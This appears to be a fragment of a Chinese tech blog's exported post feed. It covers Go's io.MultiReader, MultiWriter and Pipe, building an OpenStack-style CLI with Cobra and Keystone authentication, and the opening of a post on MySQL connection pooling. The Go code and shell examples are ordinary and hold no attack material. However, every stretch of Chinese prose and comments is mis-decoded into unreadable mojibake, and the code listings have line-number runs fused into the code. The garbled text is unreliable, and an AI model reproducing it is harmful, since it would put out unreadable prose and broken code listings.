multi.goÊ∫êÁ†ÅÂàÜÊûêËØ•Êñá‰ª∂‰∏ªË¶ÅÂÆö‰πâ‰∫ÜÂ§öË∑ØËØªÂÜôÁöÑÁõ∏ÂÖ≥ËßÑËåÉ,ËøôÈáåÁöÑÂ§öË∑ØÊåáÁöÑÊòØÂØπÂ§ö‰∏™readerÊàñËÄÖÂ§ö‰∏™writerÂêåÊó∂ÁöÑÂä®‰Ωú,ÂÆÉ‰ª¨Êé•Êî∂Â§ö‰∏™ReaderÊàñWriterÔºåËøîÂõû‰∏Ä‰∏™ReaderÊàñWriter„ÄÇÊàë‰ª¨ÂèØ‰ª•ÁåúÊÉ≥Âà∞Ëøô‰∏§‰∏™ÂáΩÊï∞Â∞±ÊòØÊìç‰ΩúÂ§ö‰∏™ReaderÊàñWriterÂ∞±ÂÉèÊìç‰Ωú‰∏Ä‰∏™„ÄÇ‰∫ãÂÆû‰∏äÔºåÂú®ioÂåÖ‰∏≠ÂÆö‰πâ‰∫Ü‰∏§‰∏™ÈùûÂØºÂá∫Á±ªÂûãÔºömutilReaderÂíåmultiWriterÔºåÂÆÉ‰ª¨ÂàÜÂà´ÂÆûÁé∞‰∫Üio.ReaderÂíåio.WriterÊé•Âè£123456789type multiReader struct &#123; readers []Reader&#125;type multiWriter struct &#123; writers []Writer&#125;func MultiReader(readers ...Reader) Reader func MultiWriter(writers ...Writer) Writer MultiReader: ÈÄªËæë‰∏äÂ∞ÜÂ§ö‰∏™ReaderÁªÑÂêàËµ∑Êù•ÔºåËøîÂõû‰∏Ä‰∏™Êñ∞ÁöÑReader, ‰ΩÜÊòØËøô‰∏™Êñ∞ReaderÂπ∂‰∏çËÉΩÈÄöËøáË∞ÉÁî®‰∏ÄÊ¨°ReadÊñπÊ≥ïËé∑ÂèñÊâÄÊúâReaderÁöÑÂÜÖÂÆπ„ÄÇÂõ†‰∏∫ÂÆÉËøô‰∏™ÈÄªËæëÁúüÁöÑÁâπÂà´ÁÆÄÂçï, Âæ™ÁéØËØªÂèñÊâÄÊúâÁöÑReader, ËØªÂÆå‰∏Ä‰∏™ËøîÂõû‰∏Ä‰∏™, Âè™ÊòØÊ≠£Â∏∏ËØªÂÆåËøáÂêéÁöÑEOFË¢´ÈáçÁΩÆ‰∏∫nil, ËøôÊ†∑ÁöÑÁªìÊûúÂ∞±ÊòØ Êàë‰ª¨ËøòÂæóÂú®Â§ñÈù¢ÂÜçÊ¨°Âæ™ÁéØËØªÂèñ‰∏ÄÊ¨°, Áõ¥Âà∞EOF1234567891011121314151617181920212223242526272829package mainimport ( "bytes" "fmt" "io" "strings")func main() &#123; readers := []io.Reader&#123; strings.NewReader("from strings reader\n"), bytes.NewBufferString("from bytes buffer\n"), &#125; reader := io.MultiReader(readers...) data := make([]byte, 0, 1024) // Âæ™ÁéØËØªÂèñÊØè‰∏™readerËøîÂõûÁöÑÂÜÖÂÆπÊù•ÊãºÊé•, // Áõ¥Âà∞ÊâÄÊúâreaderËØªÂèñÂêéËøîÂõûEOFÂÅúÊ≠¢ for n, err := 0, error(nil); err != io.EOF; &#123; tmp := make([]byte, 512) n, err = reader.Read(tmp) data = append(data, tmp[:n]...) &#125; fmt.Printf("%s", data)&#125; ÂÉè‰∏äÈù¢ËøôÊ†∑‰ΩøÁî®ÊòæÁÑ∂ÊúâÁÇπÈ∫ªÁÉ¶, ÊØîËæÉÊñπ‰æøÁöÑ‰ΩøÁî®ÊñπÂºèËøòÊòØËÅöÂêàËøáÂêéÁõ¥Êé•‰ΩøÁî®io.CopyÊù•ÊêûÂÆö12345678910111213141516171819package mainimport ( "bytes" "io" "os" "strings")func main() &#123; readers := []io.Reader&#123; strings.NewReader("from strings reader\n"), bytes.NewBufferString("from bytes buffer\n"), &#125; reader := io.MultiReader(readers...) io.Copy(os.Stdout, reader)&#125; MultiWriter: ÂíåMultiReaderÁ±ª‰ºº, Â∞ÜÂ§ö‰∏™writerËÅöÂêàÈÉΩ‰∏Ä‰∏™sliceÈáåÈù¢, ÁÑ∂ÂêéÁî®forÂæ™ÁéØÂÜô, ÂÆûÈôÖ‰∏äÂ∞±ÊòØÂ∞ÜÂêëËá™Ë∫´ÂÜôÂÖ•ÁöÑÊï∞ÊçÆÂêåÊ≠•ÂÜôÂÖ•Âà∞ÊâÄÊúâwriters‰∏≠1234567891011121314151617package mainimport ( "io" "os")func main() &#123; // Áõ¥Êé•Êù•2‰∏™writer writers := []io.Writer&#123; os.Stdout, os.Stderr, &#125; writer := io.MultiWriter(writers...) writer.Write([]byte("hello,world\n"))&#125; pipe.goÊ∫êÁ†ÅÂàÜÊûêËØ•Êñá‰ª∂‰∏ªË¶ÅÂÆö‰πâ‰∫ÜÊµÅÂºèIOÁöÑÁõ∏ÂÖ≥ËßÑËåÉ,‰∏ªË¶ÅÂ∞±ÊòØPipe, PipeÂú®ÂÜÖÂ≠ò‰∏≠ÂàõÂª∫‰∏Ä‰∏™ÂêåÊ≠•ÁÆ°ÈÅìÔºåÁî®‰∫é‰∏çÂêåÂå∫ÂüüÁöÑ‰ª£Á†Å‰πãÈó¥Áõ∏‰∫í‰º†ÈÄíÊï∞ÊçÆ, Âõ†Ê≠§ÂíåÊó†ÁºìÂÜ≤channelÂæàÂÉèÔºåÂõ†Ê≠§‰∏çËÉΩÂú®‰∏Ä‰∏™goroutine‰∏≠ËøõË°åËØªÂíåÂÜô„ÄÇÂêåÊ†∑ Áî±‰∫éÁÆ°ÈÅìÊ≤°ÊúâÁºìÂ≠òÂå∫, ÊâÄ‰ª•Âíåchannel‰∏ÄÊ†∑ ÂØπ‰∫éËØªÂÜôÂíåÂÖ≥Èó≠ÈÉΩÊòØ Âπ∂Ë°åÂÆâÂÖ®ÁöÑ„ÄÇ123456789101112131415161718192021222324252627// A pipe is the shared pipe structure underlying PipeReader and PipeWriter.type pipe struct &#123; rl sync.Mutex // gates readers one at a time wl sync.Mutex // gates writers one at a time l sync.Mutex // protects remaining fields data []byte // data remaining in pending write rwait sync.Cond // waiting reader wwait sync.Cond // waiting writer rerr error // if reader closed, error to give writes werr error // if writer closed, error to give reads&#125;// A PipeReader is the read half of a pipe.type PipeReader struct &#123; p *pipe&#125;// A PipeWriter is the write half of a pipe.type PipeWriter struct &#123; p *pipe&#125;func Pipe() (*PipeReader, *PipeWriter) &#123; p := new(pipe) p.rwait.L = &amp;p.l p.wwait.L = &amp;p.l r := &amp;PipeReader&#123;p&#125; w := &amp;PipeWriter&#123;p&#125; return r, w&#125; PipeReader: ÊòØÁÆ°ÈÅìÁöÑËØªÂèñÁ´Ø„ÄÇÂÆÉÂÆûÁé∞‰∫Üio.ReaderÂíåio.CloserÊé•Âè£ÔºåÂ¶ÇÊûúÁÆ°ÈÅìË¢´ÂÖ≥Èó≠ÔºåÂàô‰ºöËøî‰ºö‰∏Ä‰∏™ÈîôËØØ‰ø°ÊÅØÔºö Â¶ÇÊûúÂÜôÂÖ•Á´ØÈÄöËøá CloseWithError ÊñπÊ≥ïÂÖ≥Èó≠‰∫ÜÁÆ°ÈÅìÔºåÂàôËøîÂõûÂÖ≥Èó≠Êó∂‰º†ÂÖ•ÁöÑÈîôËØØ‰ø°ÊÅØ„ÄÇ Â¶ÇÊûúÂÜôÂÖ•Á´ØÈÄöËøá Close ÊñπÊ≥ïÂÖ≥Èó≠‰∫ÜÁÆ°ÈÅìÔºåÂàôËøîÂõû io.EOF„ÄÇ Â¶ÇÊûúÊòØËØªÂèñÁ´ØÂÖ≥Èó≠‰∫ÜÁÆ°ÈÅìÔºåÂàôËøîÂõû io.ErrClosedPipe„ÄÇ PipeWriter: ÊòØÁÆ°ÈÅìÁöÑÂÜôÂÖ•Á´Ø„ÄÇÂÆÉÂÆûÁé∞‰∫Üio.WriterÂíåio.CloserÊé•Âè£, Â¶ÇÊûúÁÆ°ÈÅìË¢´ÂÖ≥Èó≠ÔºåÂàô‰ºöËøî‰ºö‰∏Ä‰∏™ÈîôËØØ‰ø°ÊÅØÔºö Â¶ÇÊûúËØªÂèñÁ´ØÈÄöËøá CloseWithError ÊñπÊ≥ïÂÖ≥Èó≠‰∫ÜÁÆ°ÈÅìÔºåÂàôËøîÂõûÂÖ≥Èó≠Êó∂‰º†ÂÖ•ÁöÑÈîôËØØ‰ø°ÊÅØ„ÄÇ Â¶ÇÊûúËØªÂèñÁ´ØÈÄöËøá Close ÊñπÊ≥ïÂÖ≥Èó≠‰∫ÜÁÆ°ÈÅìÔºåÂàôËøîÂõû io.ErrClosedPipe„ÄÇ Â¶ÇÊûúÊòØÂÜôÂÖ•Á´ØÂÖ≥Èó≠‰∫ÜÁÆ°ÈÅìÔºåÂàôËøîÂõû io.ErrClosedPipe„ÄÇ Pipe: ÂÆÉÂ∞Üio.ReaderËøûÊé•Âà∞io.Writer„ÄÇ‰∏ÄÁ´ØÁöÑËØªÂèñÂåπÈÖçÂè¶‰∏ÄÁ´ØÁöÑÂÜôÂÖ•ÔºåÁõ¥Êé•Âú®Ëøô‰∏§Á´Ø‰πãÈó¥Â§çÂà∂Êï∞ÊçÆ 123456789101112131415161718192021222324252627282930313233343536373839404142434445package mainimport ( "fmt" "io" "log" "time")func main() &#123; Pipe()&#125;func Pipe() &#123; rPipe, wPipe := io.Pipe() go Read(rPipe) Write(wPipe) time.Sleep(2 * time.Second)&#125;func Write(pipeWriter *io.PipeWriter) &#123; _, err := pipeWriter.Write([]byte("Pipe ÁÆ°ÈÅìÊµãËØï")) if err != nil &#123; log.Fatal(err) &#125; // ËÆ∞ÂæóÂÜôÂÖ•Á´ØÂÖ≥Èó≠Pipe pipeWriter.CloseWithError(io.EOF) fmt.Println("ÂÜôÂÖ•ÂÆåÊàê")&#125;func Read(pipeReader *io.PipeReader) &#123; data := make([]byte, 1024) for n, err := 0, error(nil); err != io.EOF; &#123; tmp := make([]byte, 512) n, err = pipeReader.Read(tmp) if err != nil &amp;&amp; err != io.EOF &#123; log.Fatal(err) &#125; data = append(data, tmp[:n]...) &#125; fmt.Println("Data: ", string(data))&#125;]]></content>
      <categories>
        <category>ÂºÄÂèëËØ≠Ë®Ä</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>io</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[‰ΩøÁî®GolangÂºÄÂèëOpenStackÊúçÂä°ÁöÑCLI]]></title>
    <url>%2F2017%2F04%2F23%2Fopenstack-golang-cli%2F</url>
    <content type="text"><![CDATA[Áî±‰∫éÊàë‰ª¨ÈúÄË¶ÅÁºñÂÜôËá™Â∑±ÊúçÂä°ÁöÑÂÆ¢Êà∑Á´ØÔºå‰πãÂâçÂèÇËÄÉËøámagnumÁöÑpythonÂÆ¢Êà∑Á´ØÔºåÁºñÂÜôËøá‰∏Ä‰∏™ÔºåÊï¥‰ΩìÊÑüÂèóÂ∞±ÊòØ: ‰∏Ä‰ª∂ÁÆÄÂçïÁöÑ‰∫ãÂÑøÔºåË¢´‰ªñÂ∞ÅË£ÖÁöÑÂæàÂ§çÊùÇÔºåËÄå‰∏îËøòÊúâ‰∏Ä‰∏™ÂÖ≥ÈîÆÁóõÁÇπÔºåÈÉ®ÁΩ≤ÈóÆÈ¢ò: 1.‰æùËµñpythonÁéØÂ¢É 2. Ëπ©ËÑöÁöÑ‰∫åËøõÂà∂ÊâìÂåÖÊñπÂºè„ÄÇ Âõ†Ê≠§Ôºå‰Ωú‰∏∫‰∏Ä‰∏™‰∫ßÂìÅÁöÑCLIÔºå‰ª•‰∫åËøõÂà∂ÊñπÂºè‰∫§‰ªò‰ºöÂ∏¶Êù•ËØ∏Â§öÊñπ‰æøÔºåÊØîÂ¶Çcloud foundry‰πüÁî®golangÈáçÂÜô‰∫Ü‰ªñÁöÑÂÆ¢Êà∑Á´ØÈÉ®ÂàÜ„ÄÇ CobraÁÆÄ‰ªãÂú®ÂçöÂÆ¢ÁöÑÂºÄÁØáÂÜôËøá‰∏ÄÁØácobraÁöÑÂçöÂÆ¢: Â¶Ç‰Ωï‰ΩøÁî®golangÁºñÂÜôÊºÇ‰∫ÆÁöÑÂëΩ‰ª§Ë°åÂ∑•ÂÖ∑, ÂæàÂ§öÊµÅË°åÁöÑCLIÈÉΩÂü∫‰∫éËøô‰∏™Â∫ìÂºÄÂèëÔºåÊØîÂ¶Çkubectl, etcdctl, dockerÁ≠â, Âü∫Êú¨ÁöÑÊ¶ÇÂøµÂíåÁî®Ê≥ïËØ∑ÂèÇËÄÉ‰πãÂâçÁöÑÂçöÂÆ¢„ÄÇ‰∏çÂñúÊ¨¢ÊàëÂï∞Âó¶ÁöÑÔºåÁõ¥Êé•ÁúãÊ∫êÁ†Å:ÂÆåÊï¥‰ª£Á†ÅÁ§∫‰æã Âü∫‰∫éRESTfulÁöÑCLIÊâìÈÄ†ÁöÑËøô‰∏™CLIÊòØRESTfulÁöÑÂÆ¢Êà∑Á´Ø, Âú®RESTfulÈáåÈù¢‰ª•ËµÑÊ∫ê(Resource)‰∏∫Ê†∏ÂøÉÔºåÂõ†Ê≠§ÂÆ¢Êà∑Á´Ø‰πüÈúÄË¶Å‰ª•ËµÑÊ∫êÁöÑÂΩ¢ÂºèË°®Áé∞, ÊØîÂ¶ÇDockerÁöÑ Management Commands:12345678910111213Management Commands: checkpoint Manage checkpoints container Manage containers image Manage images network Manage networks node Manage Swarm nodes plugin Manage plugins secret Manage Docker secrets service Manage services stack Manage Docker stacks swarm Manage Swarm system Manage Docker volume Manage volumes ËØ•ËµÑÊ∫êÂÖÅËÆ∏ÁöÑÊìç‰Ωú:1234567891011121314151617181920212223‚ûú uniresctl git:(dev_maojun) docker image -hFlag shorthand -h has been deprecated, please use --helpUsage: docker image COMMANDManage imagesOptions: --help Print usageCommands: build Build an image from a Dockerfile history Show the history of an image import Import the contents from a tarball to create a filesystem image inspect Display detailed information on one or more images load Load an image from a tar archive or STDIN ls List images prune Remove unused images pull Pull an image or a repository from a registry push Push an image or a repository to a registry rm Remove one or more images save Save one or more images to a tar archive (streamed to STDOUT by default) tag Create a tag TARGET_IMAGE that refers to SOURCE_IMAGE Âõ†Ê≠§, ËΩÆÂªì‰∏äÊàë‰ª¨ÈúÄË¶ÅÊâìÈÄ†ËøôÊ†∑‰∏ÄÁßçÈ£éÊ†ºÁöÑRESTful CLI OpenStackÊúçÂä° CLIÊàë‰ª¨ÁöÑOpenStackÊúçÂä°ÊòØËá™Â∑±ÂºÄÂèëÁöÑ, ÂºÄÂèëÂá∫Êù•ÁöÑCLIÈ£éÊ†ºÊÉ≥Ë¶ÅÂíåOpenstackÁ§æÂå∫È£éÊ†º‰∏ÄËá¥(ÈïøÁõ∏Áõ∏Ëøë), Ëøô‰∏úË•øÁ§æÂå∫ÊòØÊ≤°ÊúâGolangÁâàÊú¨ÁöÑ(ÊúâÁöÑËØùÁªôÊàëÁïôË®Ä, ÊàëÁúüÊ≤°ÊâæÂà∞), Âõ†Ê≠§Êï¥‰∏™Êû∂Â≠êÈúÄË¶ÅËá™Â∑±ÊûÑÂª∫, Áî±‰∫écobraÊû∂Â≠êÊØîËæÉÊàêÁÜü, Â¶ÇÊûúÂè™Áî®ÂÆòÊñπÁöÑFlagÂ∫ìÊù•ÂÅöÁöÑËØùÔºå‰ºöÊúâÂæàÂ§öÈáçÂ§çÂ∑•‰Ωú, Âõ†Ê≠§‰ΩøÁî®cobra‰∏∫Âü∫Á°ÄÊù•ËøõË°åÊûÑÂª∫„ÄÇ Ë¶ÅÂÅöÊàêÂíåOpenstackÈ£éÊ†ºÁ±ª‰ººÁöÑCLI, Âú®cobraÁöÑÂü∫Á°Ä‰∏äÊàë‰ª¨ÈúÄË¶ÅÂä†ÂÖ•2‰∏™ÁªÑ‰ª∂: keystoneËÆ§ËØÅ: ÂØπÊØè‰∏Ä‰∏™ËµÑÊ∫êÁöÑËÆøÈóÆÂøÖÈ°ªÈÄöËøákeystoneËÆ§ËØÅÊâçËÉΩËÆøÈóÆ, Âõ†Ê≠§ËÆ§ËØÅÈÉ®ÂàÜÊòØÂÖ®Â±ÄÁöÑ„ÄÇ Ë°®Ê†ºËæìÂá∫: OpenstackCLIÊääËµÑÊ∫ê‰ª•TableÁöÑÊñπÂºèËæìÂá∫, Ëøô‰∏™‰πüÈúÄË¶ÅÂçïÁã¨ÂÆûÁé∞„ÄÇ Êê≠Âª∫CLIÊû∂Â≠ê ÂÆåÊï¥‰ª£Á†ÅÁöÑÊ†óÂ≠êËØ∑ÁúãGithub: ÂÆåÊï¥‰ª£Á†ÅÁ§∫‰æã ÂàùÂßãÂåñapp, Ê∑ªÂä†resourceAÂíåresourceB123cobra init app-clicobra add resourceAcobra add resourceB ËÆøÈóÆÊØè‰∏Ä‰∏™resourceÈÉΩÈúÄË¶ÅÁªèËøákeystoneÁöÑËÆ§ËØÅ,Âõ†Ê≠§ËÆ§ËØÅÂ±û‰∫é‰∏Ä‰∏™ÂÖ®Â±ÄÈÉΩË¶ÅÊâßË°åÁöÑÈÄªËæë, ÂøÖÈ°ªÊîæÂú®ÊúÄÂâçÈù¢ÔºåËøôÈáåCobraÊèê‰æõÁöÑ‰∏ÄÁªÑHookÂèØ‰ª•Ëß£ÂÜ≥Ëøô‰∏™ÈóÆÈ¢ò Â∏¶ÈîôËØØÂ§ÑÁêÜÁöÑHookÂΩìÂ§ÑÁêÜËøáÁ®ã‰∏≠Â¶ÇÊûú‰∫ßÁîü‰∫ÜerrorÂèØ‰ª•Áõ¥Êé•returnÂá∫Êù•, ‰ªéËÄå‰∏≠Êñ≠ÂëΩ‰ª§ÁöÑÁªßÁª≠ÊâßË°å, Âõ†Ê≠§ËÆ§ËØÅÈÉ®ÂàÜÊàë‰ª¨ÈúÄË¶ÅËøôÁßçÂ∏¶ÈîôËØØÂ§ÑÁêÜÁöÑHook, Âõ†‰∏∫ËÆ§ËØÅÂ§±Ë¥•ÈúÄË¶Å‰∏≠Êñ≠ËØ∑Ê±Ç,ÂÖ∂Ê¨°Ôºåcobra Âú®ÂëΩ‰ª§ÂáΩÊï∞ÁöÑÊâßË°åÂâçÂêéÂàÜÂà´ËÆæÁΩÆ‰∫Ü2ÁªÑHook, ÊâßË°åÁöÑÈ°∫Â∫èÂ¶Ç‰∏ã: PersistentPreRunE: Êó†ËÆ∫ÂáΩÊï∞ Êâß‰∏çÊâßË°å ËØ•ÂáΩÊï∞ÈÉΩ‰ºöËøêË°å PreRunE: Âú®ÂáΩÊï∞ÊâßË°åÂâçÊâßË°å RunE: ÊâßË°åÂáΩÊï∞ PostRunE: ÂáΩÊï∞ÊâßË°åÂêéÊâßË°å PersistentPostRunE: Êó†ËÆ∫ÂáΩÊï∞ Êâß‰∏çÊâßË°å ËØ•ÂáΩÊï∞ÈÉΩ‰ºöÊâßË°å Âà©Áî®cobraÊèê‰æõÁöÑPersistentPreRunEÊù•ÂÆûÁé∞È™åËØÅÂäüËÉΩ123456789101112// RootCmd represents the base command when called without any subcommandsvar RootCmd = &amp;cobra.Command&#123; Use: "app-cli", Short: "A brief description of your application", Long: `A longer description that spans multiple lines and likely containsexamples and usage of using your application. For example:Cobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.`, PersistentPreRunE: auth,&#125; authÂáΩÊï∞ÂÆûÁé∞ËÆ§ËØÅÂπ∂‰∏çÈöæ, ÂÖ≥ÈîÆÊòØauthËøáÂêéÁöÑtoken Â¶Ç‰Ωï‰º†ÈÄíÁªôÂêéÈù¢ÁöÑÂ≠êÂëΩ‰ª§‰ΩøÁî®, ÂèÇËÄÉetcdctlÂíådockerÈÉ®ÂàÜÈÉΩ‰ΩøÁî®‰∏ä‰∏ãÊñáÊù•ÂÆûÁé∞Ëøô‰∏™ÈúÄÊ±Ç, cobraÈáåÈù¢‰πüÊ≤°ÊúâÂú∞ÊñπÁªôÊàëÂ≠ò‰∏ä‰∏ãÊñá, Âõ†Ê≠§ÈúÄË¶Å‰∏ìÈó®Áî®‰∏Ä‰∏™Ê®°ÂùóÊù•‰øùÊåÅ ÂÖ®Â±ÄÁöÑ‰∏ä‰∏ãÊñá, Âõ†Ê≠§ÈúÄË¶ÅÊâãÂä®ÂÆûÁé∞‰∏Ä‰∏™commonÂåÖ„ÄÇ123456789101112131415161718192021222324252627282930313233343536package common// GlobalFlag use to contain the all contextvar GlobalFlag *globalFlagtype globalFlag struct &#123; endpoint string token string&#125;func (g *globalFlag) SetToken(token string) &#123; g.token = token&#125;func (g *globalFlag) GetToken() string &#123; return g.token&#125;func (g *globalFlag) SetEndPoint(url string) &#123; g.endpoint = url&#125;func (g *globalFlag) GetEndPoint() string &#123; return g.endpoint&#125;func (g *globalFlag) GetClient() *Client &#123; client, _ := NewClient(g.endpoint, g.token) return client&#125;func init() &#123; if GlobalFlag == nil &#123; GlobalFlag = &amp;globalFlag&#123;&#125; &#125;&#125; ÊúÄÂêéÂú®commonÂåÖÈáåÈù¢Ê∑ªÂä†2‰∏™Â≠êÂåÖ: keystone, printTable, keystone Áî®‰∫éÂÆûÁé∞‰∏ékeystoneËÆ§ËØÅÁöÑËøáÁ®ã, printTableÁî®‰∫éÊâìÂç∞ÊúÄÂêéÁªìÊûúÁöÑË°®Ê†º,ÂÖ∑‰ΩìËØ¶ÊÉÖËØ∑ÁúãÊ∫êÁ†Å„ÄÇ Ê∑ªÂä†ËµÑÊ∫ê‰∏∫ÊØè‰∏Ä‰∏™ËµÑÊ∫êÊ∑ªÂä†5‰∏™Âü∫Á°ÄÁöÑÊìç‰Ωú:get, list, create, delete, update„ÄÇÂè¶Ëµ∑‰∏Ä‰∏™resourceAÁöÑÂåÖÔºåÂÆûÁé∞Ëøô‰∫õÊñπÊ≥ïÔºåÊ∑ªÂä†Âà∞Â≠êÂëΩ‰ª§Âç≥ÂèØÔºå ÊØîÂ¶Ç:123456789func init() &#123; RootCmd.AddCommand(resourceACmd) resourceACmd.AddCommand(resourceA.CreateCmd, resourceA.ListCmd, resourceA.GetCmd, resourceA.UpdateCmd, resourceA.DeleteCmd)&#125; Â§ßÊ¶ÇÊïàÊûúÂ¶Ç‰∏ã123456789101112131415161718192021222324252627282930‚ûú app-cli git:(master) ‚úó go run main.go resourceA -hA longer description that spans multiple lines and likely contains examplesand usage of using your command. For example:Cobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.Usage: app-cli resourceA [flags] app-cli resourceA [command]Available Commands: create create an resource delete delete an resource get get an resource list list resources update update an resourceGlobal Flags: --api-endpoint string unires service endpoint --auth_url string keyston auth url --idenntity-api-version string keystone auth version --password string keystone auth user password --project-domain-name string keystone auth user project domain --project-name string keystone auth user project name --user-domain-name string keystone auth user domain name --username string keystone auth userUse "app-cli resourceA [command] --help" for more information about a command. ‰ΩøÁî®ÊïàÊûúÂíå‰ΩøÁî®openstack‰∏ÄÊ†∑Ôºå‰Ω†ÈúÄË¶ÅÊúâ‰∏Ä‰∏™admin_openrc Áî®‰∫éÂØºÂÖ•ÁéØÂ¢ÉÂèòÈáè12345678export OS_USERNAME=adminexport OS_PASSWORD=adminexport OS_PROJECT_NAME=admin.cloudexport OS_USER_DOMAIN_NAME=adminexport OS_PROJECT_DOMAIN_NAME=adminexport OS_AUTH_URL=http://127.0.0.1:35357/v3export OS_IDENTITY_API_VERSION=3export UNIRES_ENDPOINT=http://127.0.0.1:8080 ÊØîÂ¶Ç12source admin_openrc./app-cli resourceA get]]></content>
      <categories>
        <category>ÂºÄÂèëËØ≠Ë®Ä</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>cobra</tag>
        <tag>openstack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[golang‰∏≠mysqlËøûÊé•Ê±†‰ΩøÁî®]]></title>
    <url>%2F2017%2F04%2F05%2Fgolang-mysql-connection-pool%2F</url>
    <content type="text"><![CDATA[Âú®‰ΩøÁî®golangÊù•Â§ÑÁêÜÊï∞ÊçÆÂ∫ìÁöÑÊó∂ÂÄôÔºå‰∏∫‰∫ÜÊèêÂçáÊÄßËÉΩÔºåÂæÄÂæÄÈÉΩ‰ºö‰ΩøÁî®ËøûÊé•Ê±†ÔºåÊúâ‰∫õ‰∫∫ÂæÄÂæÄ‰ºöËá™Â∑±ÂÆûÁé∞‰∏Ä‰∏™ËøûÊé•Ê±†ÔºåÁî®Êù•‰∫íÁî®mysqlËøûÊé•Ôºå‰ΩÜÊòØÂ¶ÇÊûú‰Ω†Á®çÂæÆÁªÜÂøÉ‰∏ÄÁÇπÔºå Â∞±‰ºöÂèëÁé∞ÂÜÖÂª∫ÁöÑsqlÂåÖÂ∑≤ÁªèÂÆûÁé∞‰∫ÜËøûÊé•Ê±†„ÄÇsql.OpenÂáΩÊï∞ÂÆûÈôÖ‰∏äÂºèËøîÂõû‰∏Ä‰∏™ËøûÊé•Ê±†ÂØπË±°ÔºåËÄå‰∏çÊòØÂçï‰∏™ËøûÊé•„ÄÇ golangÊú¨Ë∫´Ê≤°ÊúâÊèê‰æõÈìæÊé•mysqlÁöÑÈ©±Âä®Ôºå‰ΩÜÊòØÂç¥ÂÆö‰πâ‰∫ÜÊï∞ÊçÆÂ∫ìÁöÑÊ†áÂáÜÊé•Âè£(ÂÜÖÂª∫ÁöÑsqlÂåÖ), Á¨¨‰∏âÊñπÂºÄÂèëÂÆûÁé∞Ëøô‰∫õÊé•Âè£Â∞±ÂÆåÊàê‰∫ÜÁõ∏Â∫îÈ©±Âä®ÁöÑÂºÄÂèë„ÄÇÁ¨¨‰∏âÊñπÊèê‰æõmysqlÁöÑÈ©±Âä®ÊØîËæÉÂ§öÔºåÈÅµÂæ™ÂÆòÊñπsqlÊé•Âè£ËßÑËåÉÁöÑ‰πüÊúâÂ•ΩÂá†‰∏™, ‰ΩÜÊòØ‰ΩøÁî®ÊúÄÂπøÁöÑ,github‰∏äÊòüÊúÄÂ§öÂ∫îËØ•ÊòØhttps://github.com/go-sql-driver/mysql, ‰ª•‰∏ãÁöÑÊâÄÊúâÊìç‰ΩúÈÉΩ‰ª•ËØ•È©±Âä®ËøõË°åÊºîÁ§∫„ÄÇ Êï∞ÊçÆÂ∫ìÁöÑÂü∫Êú¨Êìç‰ΩúËøôÈáå‰∏ªË¶Å‰ªãÁªçÊï∞ÊçÆÂ∫ìÊìç‰Ωú‰∏≠‰∏Ä‰∫õÂ∏∏ËßÅÊìç‰ΩúÔºåÊØîÂ¶ÇÂª∫Ë°®Ôºå‰ª•ÂèäÊï∞ÊçÆÁöÑÂ¢ûÂà†ÊîπÊü•„ÄÇ È¶ñÂÖàÔºåÊàë‰ª¨ÈúÄË¶ÅÂàõÂª∫‰∏ÄÂº†Ë°®ÔºåÁî®‰∫éÂ≠òÂÇ®Êï∞ÊçÆ, Êàë‰ª¨ÂèØ‰ª•ÈÄöËøádbÁöÑExecÊù•ÊâßË°åSQLËØ≠Âè•ÔºåÊØîÂ¶Ç‰∏ãÈù¢ÊòØ‰∏Ä‰∏™ÂàõÂª∫Ë°®ÁöÑÂáΩÊï∞:123456789101112131415161718192021func createTable() &#123; db, err := sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") checkErr(err) table := `CREATE TABLE IF NOT EXISTS test.user ( user_id INT(11) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT 'Áî®Êà∑ÁºñÂè∑', user_name VARCHAR(45) NOT NULL COMMENT 'Áî®Êà∑ÂêçÁß∞', user_age TINYINT(3) UNSIGNED NOT NULL DEFAULT 0 COMMENT 'Áî®Êà∑Âπ¥ÈæÑ', user_sex TINYINT(3) UNSIGNED NOT NULL DEFAULT 0 COMMENT 'Áî®Êà∑ÊÄßÂà´', PRIMARY KEY (user_id)) ENGINE = InnoDB AUTO_INCREMENT = 1 DEFAULT CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'Áî®Êà∑Ë°®'` if _, err := db.Exec(table); err != nil &#123; checkErr(err) &#125;&#125; Êúâ‰∫ÜË°®ËøáÂêéÔºåÊàë‰ª¨ÈúÄË¶ÅÊèíÂÖ•Êï∞ÊçÆ, ÁêÜËÆ∫‰∏äÂèØ‰ª•Â∞ÜÊèíÂÖ•ÁöÑSQLËØ≠Âè•ÂáÜÂ§áÂ•Ω, Â°´ÂÖ•ExecÂç≥ÂèØÔºå‰ΩÜÊòØsqlÂ∑≤ÁªèÂØπËøôÁßçÂ∏∏Áî®ÁöÑÂú∫ÊôØÊäΩË±°Âá∫‰∫Ü‰∏Ä‰∏™PrepareÊñπÊ≥ïÔºåPrepareÊñπÊ≥ïÂ∞ÜSQLÁöÑÈÄªËæëÂíåÊï∞ÊçÆÂâ•Á¶ªÂºÄÊù•ÔºåÈÄöËøáÂç†‰ΩçÁ¨¶Êù•ÁîüÊàê‰∏Ä‰∏™SQLË°®ËææÂºè(statement),ÁÑ∂ÂêéË°®ËææÂºèÊâßË°åÊó∂Ôºå‰º†ÂÖ•ÂÖ∑‰ΩìÁöÑÈúÄË¶ÅÊèíÂÖ•ÁöÑÊï∞ÊçÆ:123456789101112func insert() &#123; db, err := sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") checkErr(err) stmt, err := db.Prepare(`INSERT user (user_name,user_age,user_sex) values (?,?,?)`) checkErr(err) res, err := stmt.Exec("tony", 20, 1) checkErr(err) id, err := res.LastInsertId() checkErr(err) fmt.Println(id)&#125; ÊèíÂÖ•Êï∞ÊçÆËøá‰ºöÊàë‰ª¨Â∞±ÂèØ‰ª•Ôºå‰ªé‰∏≠Êü•ËØ¢Êï∞ÊçÆËÆ∞ÂΩï‰∫ÜÔºåÊü•ËØ¢Âá∫Êù•ÁöÑÊï∞ÊçÆ‰ª•Ë°å‰∏∫Âçï‰ΩçËøõË°åÁªÑÁªáÔºàRows)Ôºå 